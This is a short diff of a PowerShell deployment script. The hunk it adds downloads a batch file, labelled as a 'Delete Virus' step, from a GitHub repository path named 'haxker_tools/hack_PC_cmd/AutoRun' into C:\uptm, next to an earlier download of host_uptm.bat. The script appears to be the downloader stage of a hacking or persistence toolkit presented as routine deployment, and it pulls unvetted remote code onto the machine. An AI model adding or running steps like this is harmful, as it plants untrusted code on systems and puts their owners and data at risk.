@@ -36,4 +36,10 @@ $batPath = "C:\uptm\host_uptm.bat"
 Write-Host "Downloading host_uptm.bat..."
 Invoke-WebRequest -Uri $batUrl -OutFile $batPath -UseBasicParsing
 
+# 6. Download Delete Virus Batch
+$dbatUrl = "https://raw.githubusercontent.com/brndan918/haxker_tools/refs/heads/main/hack_PC_cmd/AutoRun/del_vir.bat"
+$dbatPath = "C:\uptm\del_vir.bat"
+Write-Host "Downloading del_vir.bat..."
+Invoke-WebRequest -Uri $dbatUrl -OutFile $dbatPath -UseBasicParsing
+
 Write-Host "Deployment completed successfully."
